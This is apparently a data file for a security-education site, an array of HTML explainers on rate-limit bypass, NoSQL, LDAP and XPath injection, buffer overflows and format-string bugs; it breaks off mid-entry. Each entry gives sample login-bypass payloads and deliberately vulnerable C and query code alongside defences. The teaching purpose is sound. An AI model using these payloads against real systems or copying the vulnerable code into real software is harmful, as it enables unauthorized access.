allVulnerabilities.push(
{
    "id": 37,
    "title": "API Rate Limit Bypass",
    "summary": `
        <p><b>API Rate Limit Bypass</b> is a vulnerability or security weakness that allows attackers to evade request limiting mechanisms implemented by APIs.</p>

        <p>Rate limiting is designed to restrict the number of requests a client can perform within a specific time period, but improper implementations may allow attackers to bypass these protections.</p>

        <h3>What is Rate Limiting?</h3>

        <p>Rate limiting is a security control that protects APIs from abuse, brute force attacks, scraping, Denial of Service, and automated exploitation attempts.</p>

        <h3>Basic Rate Limit Example:</h3>

        <pre><code>100 requests per minute</code></pre>

        <p>The API blocks clients after exceeding the configured threshold.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when APIs rely on weak request tracking methods or fail to enforce consistent rate limiting logic.</p>

        <h3>IP Rotation Bypass:</h3>

        <pre><code>Use multiple IP addresses</code></pre>

        <p>Attackers distribute requests across many IP addresses to evade limits.</p>

        <h3>X-Forwarded-For Header Abuse:</h3>

        <pre><code>X-Forwarded-For: 127.0.0.1</code></pre>

        <p>Some APIs trust spoofed proxy headers for client identification.</p>

        <h3>Token Rotation Example:</h3>

        <pre><code>Use multiple API keys</code></pre>

        <p>Attackers rotate authentication tokens to bypass per-user restrictions.</p>

        <h3>Why is Rate Limit Bypass Dangerous?</h3>

        <p>Successful bypasses may allow attackers to perform brute force attacks, API scraping, credential stuffing, resource exhaustion, or automated exploitation.</p>

        <h3>Brute Force Login Scenario:</h3>

        <pre><code>POST /api/login</code></pre>

        <p>Attackers continuously attempt password combinations without being blocked.</p>

        <h3>OTP Brute Force Example:</h3>

        <pre><code>POST /api/verify-otp</code></pre>

        <p>Weak rate limiting may expose one-time password systems.</p>

        <h3>Concurrent Request Bypass:</h3>

        <pre><code>Send parallel requests simultaneously</code></pre>

        <p>Race conditions may allow attackers to exceed intended limits.</p>

        <h3>Endpoint Rotation Technique:</h3>

        <pre><code>/v1/login
/v2/login</code></pre>

        <p>Different API endpoints may share inconsistent rate limiting rules.</p>

        <h3>Case Sensitivity Bypass:</h3>

        <pre><code>/API/login
/api/login</code></pre>

        <p>Improper endpoint normalization may bypass protections.</p>

        <h3>User-Agent Rotation:</h3>

        <pre><code>Change User-Agent headers</code></pre>

        <p>Weak systems may identify clients using mutable headers.</p>

        <h3>HTTP Parameter Pollution:</h3>

        <pre><code>?id=1&id=2</code></pre>

        <p>Malformed requests may confuse request counters.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Credential stuffing.</p>
        <p>2. Brute force attacks.</p>
        <p>3. API scraping.</p>
        <p>4. Resource exhaustion.</p>
        <p>5. Automated exploitation.</p>

        <h3>Indicators of Weak Rate Limiting:</h3>

        <p>1. Missing API throttling.</p>
        <p>2. Inconsistent request blocking.</p>
        <p>3. Unlimited OTP attempts.</p>
        <p>4. Trusting spoofable headers.</p>
        <p>5. Weak distributed request tracking.</p>

        <h3>Common Vulnerable API Features:</h3>

        <pre><code>Authentication systems

OTP verification

Password reset APIs

Search endpoints

Public data APIs</code></pre>

        <h3>Example Using Burp Suite Intruder:</h3>

        <pre><code>POST /api/login HTTP/1.1
Host: vulnerable-api.com</code></pre>

        <p>The attacker automates high-volume requests against vulnerable endpoints.</p>

        <h3>Unsafe Backend Example:</h3>

        <pre><code>// Weak Example

Limit requests by User-Agent only</code></pre>

        <p>Attackers can easily modify spoofable request headers.</p>

        <h3>Safe Backend Example:</h3>

        <pre><code>// Secure Example

Track IPs and accounts

Apply distributed rate limiting

Use CAPTCHA and MFA</code></pre>

        <p>The API enforces stronger anti-abuse protections.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Apply strict distributed rate limiting.</b></p>

        <p><b>2. Avoid trusting spoofable headers.</b></p>

        <p><b>3. Enforce account-based throttling.</b></p>

        <p><b>4. Use CAPTCHA for suspicious activity.</b></p>

        <p><b>5. Implement Multi-Factor Authentication (MFA).</b></p>

        <p><b>6. Detect automated attack patterns.</b></p>

        <p><b>7. Monitor abnormal API traffic continuously.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Use API gateways

Apply WAF protections

Enable distributed throttling

Restrict concurrent requests

Monitor abuse attempts</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite Intruder
OWASP ZAP
ffuf
Nuclei
Postman</code></pre>

        <h3>Difference Between Rate Limiting and Authentication:</h3>

        <p><b>Rate Limiting:</b> Restricts request frequency and abuse.</p>

        <p><b>Authentication:</b> Verifies user identity and access permissions.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may brute force passwords, abuse APIs, scrape sensitive data, exhaust backend resources, bypass OTP systems, or automate large-scale attacks against vulnerable services.</p>

        <h3>Vulnerability Severity:</h3>

        <p>API Rate Limit Bypass vulnerabilities are considered highly dangerous because weak anti-abuse protections may expose APIs to automated exploitation and large-scale attacks.</p>
    `
},


{
    "id": 38,
    "title": "NoSQL Injection in MongoDB",
    "summary": `
        <p><b>NoSQL Injection</b> is a critical vulnerability that occurs when applications fail to properly validate user input before using it in NoSQL database queries such as MongoDB.</p>

        <p>This vulnerability may allow attackers to bypass authentication, extract sensitive data, manipulate database queries, or compromise backend systems.</p>

        <h3>What is MongoDB?</h3>

        <p>MongoDB is a popular NoSQL database that stores data using flexible JSON-like documents instead of traditional SQL tables.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when user-controlled input is inserted directly into MongoDB queries without proper validation or sanitization.</p>

        <h3>Basic Vulnerable Login Example:</h3>

        <pre><code>db.users.find({
  username: userInput,
  password: passInput
})</code></pre>

        <p>The application trusts user-supplied values directly inside the database query.</p>

        <h3>Authentication Bypass Example:</h3>

        <pre><code>{
  "username": {"$ne": null},
  "password": {"$ne": null}
}</code></pre>

        <p>The attacker abuses MongoDB operators to bypass login validation.</p>

        <h3>Why is NoSQL Injection Dangerous?</h3>

        <p>Successful exploitation may allow attackers to bypass authentication, dump database contents, manipulate application logic, or gain administrative access.</p>

        <h3>MongoDB Operators Commonly Abused:</h3>

        <pre><code>$ne
$gt
$lt
$regex
$where</code></pre>

        <p>Attackers abuse MongoDB operators to alter query behavior.</p>

        <h3>Using $ne Operator:</h3>

        <pre><code>{"$ne": null}</code></pre>

        <p>The condition matches values that are not equal to null.</p>

        <h3>Regex Injection Example:</h3>

        <pre><code>{
  "username": {
    "$regex": "admin.*"
  }
}</code></pre>

        <p>Attackers use regular expressions to enumerate usernames or data.</p>

        <h3>Using $where for JavaScript Execution:</h3>

        <pre><code>{
  "$where": "this.username == 'admin'"
}</code></pre>

        <p>Some MongoDB configurations allow server-side JavaScript execution.</p>

        <h3>Blind NoSQL Injection Example:</h3>

        <pre><code>{
  "username": "admin",
  "password": {
    "$regex": "^a"
  }
}</code></pre>

        <p>Attackers extract secrets character by character using conditional responses.</p>

        <h3>Database Enumeration Example:</h3>

        <pre><code>{
  "username": {
    "$exists": true
  }
}</code></pre>

        <p>The attacker checks whether fields exist inside database documents.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Authentication bypass.</p>
        <p>2. Database extraction.</p>
        <p>3. Administrative access.</p>
        <p>4. Data manipulation.</p>
        <p>5. Remote Code Execution.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>POST /login HTTP/1.1
Host: vulnerable-api.com</code></pre>

        <p>The attacker injects malicious JSON payloads into authentication requests.</p>

        <h3>Indicators of NoSQL Injection:</h3>

        <p>1. JSON-based request bodies.</p>
        <p>2. MongoDB error messages.</p>
        <p>3. Authentication bypass behavior.</p>
        <p>4. Query operators accepted from user input.</p>
        <p>5. Unfiltered database queries.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>Login systems

Search APIs

Filtering systems

REST APIs

JSON request handlers</code></pre>

        <h3>Unsafe Backend Example:</h3>

        <pre><code>// Vulnerable Example

db.collection.find(req.body)</code></pre>

        <p>The application passes user-controlled JSON directly into database queries.</p>

        <h3>Safe Backend Example:</h3>

        <pre><code>// Secure Example

Validate input types

Block MongoDB operators

Use parameterized logic</code></pre>

        <p>The application validates and sanitizes user input before database processing.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Validate and sanitize all user input.</b></p>

        <p><b>2. Block dangerous MongoDB operators from user-controlled input.</b></p>

        <p><b>3. Use strict schema validation.</b></p>

        <p><b>4. Avoid dynamic query construction.</b></p>

        <p><b>5. Disable unnecessary server-side JavaScript execution.</b></p>

        <p><b>6. Apply least privilege database permissions.</b></p>

        <p><b>7. Monitor suspicious query behavior.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Enable input validation

Restrict database permissions

Disable unsafe operators

Monitor database activity

Enable security logging</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
NoSQLMap
OWASP ZAP
Nuclei
Postman</code></pre>

        <h3>Difference Between SQL Injection and NoSQL Injection:</h3>

        <p><b>SQL Injection:</b> Targets traditional relational databases using SQL syntax.</p>

        <p><b>NoSQL Injection:</b> Targets NoSQL databases using query operators and JSON structures.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may bypass authentication, extract sensitive database information, manipulate records, escalate privileges, or fully compromise vulnerable backend systems.</p>

        <h3>Vulnerability Severity:</h3>

        <p>NoSQL Injection vulnerabilities in MongoDB are considered extremely critical because unsafe query handling may expose entire databases and authentication systems.</p>
    `
},


{
    "id": 39,
    "title": "LDAP Injection Attack",
    "summary": `
        <p><b>LDAP Injection</b> is a dangerous vulnerability that occurs when applications improperly handle user input in LDAP queries without proper validation or sanitization.</p>

        <p>This vulnerability may allow attackers to bypass authentication, manipulate directory queries, extract sensitive information, or gain unauthorized access to enterprise systems.</p>

        <h3>What is LDAP?</h3>

        <p>LDAP stands for <b>Lightweight Directory Access Protocol</b>, a protocol commonly used for directory services, centralized authentication, and user management systems such as Active Directory.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when user-controlled input is inserted directly into LDAP queries without escaping special characters.</p>

        <h3>Basic Vulnerable LDAP Query:</h3>

        <pre><code>(&amp;(uid=userInput)(password=passInput))</code></pre>

        <p>The application builds LDAP filters using untrusted input directly.</p>

        <h3>Authentication Bypass Example:</h3>

        <pre><code>*)(uid=*))(|(uid=*</code></pre>

        <p>The attacker manipulates the LDAP filter structure to bypass login validation.</p>

        <h3>Why is LDAP Injection Dangerous?</h3>

        <p>Successful exploitation may allow attackers to bypass authentication, enumerate users, extract directory information, or access sensitive enterprise resources.</p>

        <h3>Wildcard Injection Example:</h3>

        <pre><code>*</code></pre>

        <p>The wildcard operator may match multiple directory entries.</p>

        <h3>Basic Login Bypass Payload:</h3>

        <pre><code>admin*)(|(password=*))</code></pre>

        <p>The attacker alters the LDAP filter logic to authenticate improperly.</p>

        <h3>Directory Enumeration Example:</h3>

        <pre><code>(|(uid=*))</code></pre>

        <p>The attacker attempts to retrieve all available user accounts.</p>

        <h3>Blind LDAP Injection:</h3>

        <pre><code>admin*)(mail=*</code></pre>

        <p>Attackers infer data based on application responses or behavior changes.</p>

        <h3>Common LDAP Special Characters:</h3>

        <pre><code>* ( ) \\ / &amp; |</code></pre>

        <p>These characters may alter LDAP query behavior if not escaped properly.</p>

        <h3>Information Disclosure Example:</h3>

        <pre><code>(objectClass=*)</code></pre>

        <p>The attacker attempts to retrieve all objects from the directory.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Authentication bypass.</p>
        <p>2. User enumeration.</p>
        <p>3. Sensitive directory disclosure.</p>
        <p>4. Privilege escalation.</p>
        <p>5. Enterprise reconnaissance.</p>

        <h3>Active Directory Targeting:</h3>

        <p>LDAP Injection is commonly associated with enterprise authentication systems and Active Directory environments.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>POST /login HTTP/1.1
Host: vulnerable-company.com</code></pre>

        <p>The attacker injects malicious LDAP filter payloads into authentication parameters.</p>

        <h3>Indicators of LDAP Injection:</h3>

        <p>1. LDAP-based authentication systems.</p>
        <p>2. Dynamic LDAP query construction.</p>
        <p>3. Unescaped LDAP special characters.</p>
        <p>4. Authentication anomalies.</p>
        <p>5. Directory enumeration behavior.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>Enterprise login systems

Single Sign-On systems

Employee directories

User search functionality

Active Directory integrations</code></pre>

        <h3>Unsafe Backend Example:</h3>

        <pre><code>// Vulnerable Example

filter = "(uid=" + username + ")"</code></pre>

        <p>The application inserts user input directly into LDAP filters.</p>

        <h3>Safe Backend Example:</h3>

        <pre><code>// Secure Example

Escape LDAP special characters

Use parameterized queries

Validate input strictly</code></pre>

        <p>The application sanitizes user-controlled input before LDAP processing.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Escape LDAP special characters properly.</b></p>

        <p><b>2. Use parameterized LDAP queries.</b></p>

        <p><b>3. Validate and sanitize all user input.</b></p>

        <p><b>4. Apply least privilege LDAP permissions.</b></p>

        <p><b>5. Restrict anonymous LDAP access.</b></p>

        <p><b>6. Monitor suspicious authentication activity.</b></p>

        <p><b>7. Enable strong authentication mechanisms.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Restrict directory permissions

Disable anonymous binds

Enable security logging

Monitor LDAP queries

Apply MFA protections</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Nuclei
ldapsearch
Postman</code></pre>

        <h3>Difference Between LDAP Injection and SQL Injection:</h3>

        <p><b>LDAP Injection:</b> Targets LDAP directory queries and authentication systems.</p>

        <p><b>SQL Injection:</b> Targets relational database queries.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may bypass enterprise authentication systems, enumerate users, access confidential directory information, escalate privileges, or compromise internal organizational infrastructure.</p>

        <h3>Vulnerability Severity:</h3>

        <p>LDAP Injection vulnerabilities are considered highly critical because compromised directory services may expose authentication systems and sensitive enterprise infrastructure.</p>
    `
},


{
    "id": 40,
    "title": "XPath Injection Vulnerability",
    "summary": `
        <p><b>XPath Injection</b> is a dangerous vulnerability that occurs when applications improperly handle user input inside XPath queries without proper validation or sanitization.</p>

        <p>This vulnerability may allow attackers to bypass authentication, extract sensitive XML data, manipulate queries, or access unauthorized information stored inside XML documents.</p>

        <h3>What is XPath?</h3>

        <p>XPath stands for <b>XML Path Language</b>, a query language used to navigate and retrieve data from XML documents.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when user-controlled input is directly embedded into XPath expressions without proper escaping.</p>

        <h3>Basic Vulnerable XPath Query:</h3>

        <pre><code>//users/user[username/text()='userInput'
and password/text()='passInput']</code></pre>

        <p>The application builds XPath queries using untrusted user input.</p>

        <h3>Authentication Bypass Example:</h3>

        <pre><code>' or '1'='1</code></pre>

        <p>The attacker manipulates the XPath condition to make it always evaluate as true.</p>

        <h3>Why is XPath Injection Dangerous?</h3>

        <p>Successful exploitation may allow attackers to bypass login systems, enumerate XML data, extract sensitive information, or compromise XML-based applications.</p>

        <h3>Basic Authentication Bypass Payload:</h3>

        <pre><code>' or 1=1 or '</code></pre>

        <p>The payload alters query logic and bypasses authentication checks.</p>

        <h3>XPath Query Manipulation Example:</h3>

        <pre><code>//user[name/text()='admin' or '1'='1']</code></pre>

        <p>The attacker forces the XPath query to return unintended results.</p>

        <h3>Blind XPath Injection:</h3>

        <pre><code>' and substring(password/text(),1,1)='a' and '1'='1</code></pre>

        <p>Attackers extract sensitive information character by character using conditional responses.</p>

        <h3>XML Enumeration Example:</h3>

        <pre><code>count(//users/user)</code></pre>

        <p>The attacker attempts to enumerate XML node structures and data.</p>

        <h3>XPath Operators Commonly Abused:</h3>

        <pre><code>or
and
=
contains()
substring()</code></pre>

        <p>Attackers manipulate XPath logic using built-in operators and functions.</p>

        <h3>Extracting Sensitive Data:</h3>

        <pre><code>//users/user[position()=1]</code></pre>

        <p>Attackers may retrieve arbitrary XML nodes from the document.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Authentication bypass.</p>
        <p>2. XML data extraction.</p>
        <p>3. User enumeration.</p>
        <p>4. Information disclosure.</p>
        <p>5. Application compromise.</p>

        <h3>XML-Based Authentication Systems:</h3>

        <p>Applications using XML user stores are especially vulnerable to XPath Injection attacks.</p>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>POST /login HTTP/1.1
Host: vulnerable-app.com</code></pre>

        <p>The attacker injects malicious XPath expressions into authentication parameters.</p>

        <h3>Indicators of XPath Injection:</h3>

        <p>1. XML-based backend systems.</p>
        <p>2. XPath-related error messages.</p>
        <p>3. Authentication bypass behavior.</p>
        <p>4. Dynamic XPath query construction.</p>
        <p>5. XML data leakage.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>XML login systems

Search functionality

XML databases

Single Sign-On systems

SOAP services</code></pre>

        <h3>Unsafe Backend Example:</h3>

        <pre><code>// Vulnerable Example

query = "//user[name='" + input + "']"</code></pre>

        <p>The application inserts user-controlled values directly into XPath queries.</p>

        <h3>Safe Backend Example:</h3>

        <pre><code>// Secure Example

Escape XPath input

Use parameterized XPath queries

Validate input strictly</code></pre>

        <p>The application sanitizes user input before processing XPath expressions.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Validate and sanitize all user input.</b></p>

        <p><b>2. Escape special XPath characters properly.</b></p>

        <p><b>3. Use parameterized XPath queries when possible.</b></p>

        <p><b>4. Avoid dynamic XPath query construction.</b></p>

        <p><b>5. Restrict access to sensitive XML data.</b></p>

        <p><b>6. Apply least privilege permissions.</b></p>

        <p><b>7. Monitor suspicious XPath activity.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Restrict XML access

Enable security logging

Monitor query anomalies

Use secure XML parsers

Apply authentication protections</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Nuclei
Postman
SoapUI</code></pre>

        <h3>Difference Between XPath Injection and SQL Injection:</h3>

        <p><b>XPath Injection:</b> Targets XML query structures and XPath expressions.</p>

        <p><b>SQL Injection:</b> Targets relational database queries using SQL syntax.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may bypass authentication systems, expose sensitive XML data, enumerate backend structures, manipulate XML queries, or compromise XML-based applications.</p>

        <h3>Vulnerability Severity:</h3>

        <p>XPath Injection vulnerabilities are considered highly critical because insecure XPath query handling may expose authentication systems and confidential XML data.</p>
    `
},


{
    "id": 41,
    "title": "Buffer Overflow Basics",
    "summary": `
        <p><b>Buffer Overflow</b> is a critical memory corruption vulnerability that occurs when a program writes more data into a memory buffer than it can safely hold.</p>

        <p>This vulnerability may allow attackers to crash applications, corrupt memory, execute arbitrary code, or completely compromise vulnerable systems.</p>

        <h3>What is a Buffer?</h3>

        <p>A buffer is a temporary memory area used to store data while a program is processing it.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when applications fail to verify the size of input before copying it into fixed-size memory buffers.</p>

        <h3>Basic Vulnerable C Example:</h3>

        <pre><code>char buffer[10];

strcpy(buffer, userInput);</code></pre>

        <p>If the input exceeds the buffer size, memory outside the buffer may be overwritten.</p>

        <h3>Why is Buffer Overflow Dangerous?</h3>

        <p>Successful exploitation may allow attackers to overwrite memory structures, hijack program execution flow, or execute malicious shellcode.</p>

        <h3>Stack Buffer Overflow:</h3>

        <p>This occurs when excessive data overwrites memory on the program stack.</p>

        <pre><code>char name[16];

gets(name);</code></pre>

        <p>The dangerous <code>gets()</code> function performs no input length checking.</p>

        <h3>Heap Buffer Overflow:</h3>

        <p>This occurs when dynamically allocated heap memory is overwritten.</p>

        <pre><code>malloc()
free()</code></pre>

        <p>Heap corruption may lead to arbitrary code execution.</p>

        <h3>Simple Crash Example:</h3>

        <pre><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAA</code></pre>

        <p>Excessive input may overwrite memory and crash the application.</p>

        <h3>Instruction Pointer Overwrite:</h3>

        <p>Attackers attempt to overwrite execution control data such as return addresses.</p>

        <pre><code>EIP
RIP</code></pre>

        <p>Controlling execution flow may lead to arbitrary code execution.</p>

        <h3>Shellcode Concept:</h3>

        <p>Shellcode is malicious machine code injected into memory during exploitation.</p>

        <pre><code>\x90\x90\x90</code></pre>

        <p>Attackers often use NOP sleds to improve exploit reliability.</p>

        <h3>Common Dangerous Functions:</h3>

        <pre><code>strcpy()
gets()
sprintf()
scanf()
strcat()</code></pre>

        <p>Unsafe functions frequently cause memory corruption vulnerabilities.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Application crashes.</p>
        <p>2. Arbitrary code execution.</p>
        <p>3. Privilege escalation.</p>
        <p>4. Memory corruption.</p>
        <p>5. Full system compromise.</p>

        <h3>Segmentation Fault Example:</h3>

        <pre><code>Segmentation fault (core dumped)</code></pre>

        <p>Memory corruption often causes application crashes.</p>

        <h3>Stack Layout Concept:</h3>

        <pre><code>Buffer
Saved Frame Pointer
Return Address</code></pre>

        <p>Attackers attempt to overwrite return addresses stored on the stack.</p>

        <h3>Example Using GDB:</h3>

        <pre><code>gdb vulnerable-program</code></pre>

        <p>Debuggers help researchers analyze memory corruption behavior.</p>

        <h3>Indicators of Buffer Overflow Vulnerabilities:</h3>

        <p>1. Unsafe memory functions.</p>
        <p>2. Application crashes with long input.</p>
        <p>3. Memory corruption errors.</p>
        <p>4. Segmentation faults.</p>
        <p>5. Unexpected program behavior.</p>

        <h3>Common Vulnerable Software:</h3>

        <pre><code>C applications

C++ software

Legacy services

Network daemons

Embedded systems</code></pre>

        <h3>Unsafe Backend Example:</h3>

        <pre><code>// Vulnerable Example

strcpy(buffer, input)</code></pre>

        <p>The application copies untrusted input without length validation.</p>

        <h3>Safe Backend Example:</h3>

        <pre><code>// Secure Example

Use bounded functions

Validate input length

Apply memory protections</code></pre>

        <p>The application prevents memory corruption through proper bounds checking.</p>

        <h3>Modern Protection Mechanisms:</h3>

        <pre><code>ASLR
DEP
Stack Canaries
NX Bit</code></pre>

        <p>Modern operating systems implement protections against memory exploitation.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Validate input length strictly.</b></p>

        <p><b>2. Avoid dangerous memory functions.</b></p>

        <p><b>3. Use safe bounded functions.</b></p>

        <p><b>4. Enable compiler security protections.</b></p>

        <p><b>5. Apply memory-safe programming practices.</b></p>

        <p><b>6. Use modern operating system protections.</b></p>

        <p><b>7. Perform regular security testing.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Enable ASLR

Use DEP/NX protections

Compile with stack canaries

Restrict executable memory

Apply least privilege execution</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>GDB
Immunity Debugger
Valgrind
AddressSanitizer
Metasploit</code></pre>

        <h3>Difference Between Stack and Heap Overflow:</h3>

        <p><b>Stack Overflow:</b> Corrupts stack memory and return addresses.</p>

        <p><b>Heap Overflow:</b> Corrupts dynamically allocated heap memory.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may execute arbitrary code, gain elevated privileges, crash systems, bypass security protections, or fully compromise vulnerable applications and operating systems.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Buffer Overflow vulnerabilities are considered extremely critical because memory corruption may directly lead to arbitrary code execution and full system compromise.</p>
    `
},


{
    "id": 42,
    "title": "Stack Buffer Overflow",
    "summary": `
        <p><b>Stack Buffer Overflow</b> is a dangerous memory corruption vulnerability that occurs when a program writes excessive data into a fixed-size buffer located on the stack.</p>

        <p>This vulnerability may allow attackers to overwrite critical memory structures such as return addresses, hijack program execution flow, execute arbitrary code, or fully compromise systems.</p>

        <h3>What is the Stack?</h3>

        <p>The stack is a memory region used by programs to store local variables, function parameters, and return addresses during execution.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when applications copy untrusted input into stack-based buffers without validating input size.</p>

        <h3>Basic Vulnerable C Example:</h3>

        <pre><code>void vulnerable(char *input) {

    char buffer[16];

    strcpy(buffer, input);
}</code></pre>

        <p>If the input exceeds 16 bytes, memory outside the buffer may be overwritten.</p>

        <h3>Why is Stack Buffer Overflow Dangerous?</h3>

        <p>Successful exploitation may allow attackers to overwrite return addresses and redirect execution to malicious code.</p>

        <h3>Stack Memory Layout:</h3>

        <pre><code>Buffer
Saved Frame Pointer
Return Address</code></pre>

        <p>Attackers target the stored return address to control program execution.</p>

        <h3>Simple Crash Payload:</h3>

        <pre><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAA</code></pre>

        <p>Long input may overwrite stack memory and crash the application.</p>

        <h3>Instruction Pointer Control:</h3>

        <pre><code>EIP
RIP</code></pre>

        <p>Overwriting instruction pointers may allow arbitrary code execution.</p>

        <h3>Dangerous Functions Commonly Involved:</h3>

        <pre><code>strcpy()
gets()
sprintf()
scanf()
strcat()</code></pre>

        <p>Unsafe functions frequently lead to stack memory corruption.</p>

        <h3>Example Using gets():</h3>

        <pre><code>char name[32];

gets(name);</code></pre>

        <p>The <code>gets()</code> function performs no boundary checking.</p>

        <h3>Shellcode Injection Concept:</h3>

        <p>Attackers may inject malicious machine instructions directly into memory.</p>

        <pre><code>\x90\x90\x90</code></pre>

        <p>NOP sleds are often used to improve exploit reliability.</p>

        <h3>Return Address Overwrite Example:</h3>

        <pre><code>AAAAAAAABBBBBBBBCCCCCCCC</code></pre>

        <p>Attackers craft payloads to overwrite execution control structures.</p>

        <h3>Remote Exploitation Scenario:</h3>

        <p>Network services processing untrusted data may become remotely exploitable through stack overflows.</p>

        <h3>Segmentation Fault Example:</h3>

        <pre><code>Segmentation fault (core dumped)</code></pre>

        <p>Memory corruption frequently causes crashes during exploitation attempts.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Arbitrary code execution.</p>
        <p>2. Privilege escalation.</p>
        <p>3. Application crashes.</p>
        <p>4. Remote compromise.</p>
        <p>5. Full system takeover.</p>

        <h3>Example Using GDB:</h3>

        <pre><code>gdb vulnerable-program</code></pre>

        <p>Researchers use debuggers to analyze stack corruption behavior.</p>

        <h3>Finding Offset Positions:</h3>

        <pre><code>pattern_create
pattern_offset</code></pre>

        <p>Exploit developers calculate exact overwrite positions.</p>

        <h3>Indicators of Stack Buffer Overflow:</h3>

        <p>1. Crashes with oversized input.</p>
        <p>2. Segmentation faults.</p>
        <p>3. Unsafe memory functions.</p>
        <p>4. Corrupted execution flow.</p>
        <p>5. Unexpected application behavior.</p>

        <h3>Common Vulnerable Applications:</h3>

        <pre><code>Legacy C applications

Network daemons

Embedded devices

Low-level system software

Custom native applications</code></pre>

        <h3>Unsafe Backend Example:</h3>

        <pre><code>// Vulnerable Example

strcpy(buffer, userInput)</code></pre>

        <p>The application copies untrusted input without size validation.</p>

        <h3>Safe Backend Example:</h3>

        <pre><code>// Secure Example

Use strncpy()

Validate input length

Apply stack protections</code></pre>

        <p>The application prevents stack memory corruption using safe coding practices.</p>

        <h3>Modern Protection Mechanisms:</h3>

        <pre><code>ASLR
DEP
Stack Canaries
NX Bit</code></pre>

        <p>Modern operating systems implement protections against stack exploitation.</p>

        <h3>Return-Oriented Programming (ROP):</h3>

        <p>Advanced attackers may chain existing code snippets called gadgets to bypass memory protections.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Avoid unsafe memory functions.</b></p>

        <p><b>2. Validate input length strictly.</b></p>

        <p><b>3. Use bounded memory operations.</b></p>

        <p><b>4. Enable compiler security protections.</b></p>

        <p><b>5. Apply stack canary protections.</b></p>

        <p><b>6. Use ASLR and DEP protections.</b></p>

        <p><b>7. Perform continuous security testing.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Compile with stack protection

Enable ASLR

Restrict executable memory

Use DEP/NX

Apply least privilege execution</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>GDB
Immunity Debugger
Valgrind
AddressSanitizer
Metasploit</code></pre>

        <h3>Difference Between Stack Overflow and Heap Overflow:</h3>

        <p><b>Stack Overflow:</b> Corrupts stack memory and function return addresses.</p>

        <p><b>Heap Overflow:</b> Corrupts dynamically allocated heap memory structures.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may hijack execution flow, execute malicious shellcode, bypass operating system protections, escalate privileges, or fully compromise vulnerable systems.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Stack Buffer Overflow vulnerabilities are considered extremely critical because direct execution flow manipulation may lead to complete system compromise.</p>
    `
},


{
    "id": 43,
    "title": "Format String Vulnerability",
    "summary": `
        <p><b>Format String Vulnerability</b> is a dangerous memory corruption vulnerability that occurs when user-controlled input is passed directly to formatting functions without proper validation.</p>

        <p>This vulnerability may allow attackers to read sensitive memory, leak addresses, crash applications, overwrite memory, or execute arbitrary code.</p>

        <h3>What are Format Functions?</h3>

        <p>Format functions are programming functions used to print formatted output.</p>

        <h3>Common Vulnerable Functions:</h3>

        <pre><code>printf()
fprintf()
sprintf()
snprintf()
syslog()</code></pre>

        <p>Improper use of these functions may introduce dangerous vulnerabilities.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when user input is used directly as a format string instead of plain text.</p>

        <h3>Basic Vulnerable C Example:</h3>

        <pre><code>char input[100];

scanf("%s", input);

printf(input);</code></pre>

        <p>The application passes attacker-controlled input directly into <code>printf()</code>.</p>

        <h3>Safe Example:</h3>

        <pre><code>printf("%s", input);</code></pre>

        <p>The application safely treats user input as plain text.</p>

        <h3>Why is Format String Vulnerability Dangerous?</h3>

        <p>Successful exploitation may expose sensitive memory data or allow attackers to overwrite arbitrary memory locations.</p>

        <h3>Memory Leak Example:</h3>

        <pre><code>%x %x %x %x</code></pre>

        <p>The attacker reads stack memory values using format specifiers.</p>

        <h3>String Disclosure Example:</h3>

        <pre><code>%s</code></pre>

        <p>The attacker may leak memory contents as strings.</p>

        <h3>Arbitrary Memory Write Example:</h3>

        <pre><code>%n</code></pre>

        <p>The dangerous <code>%n</code> specifier writes values into memory.</p>

        <h3>Stack Memory Enumeration:</h3>

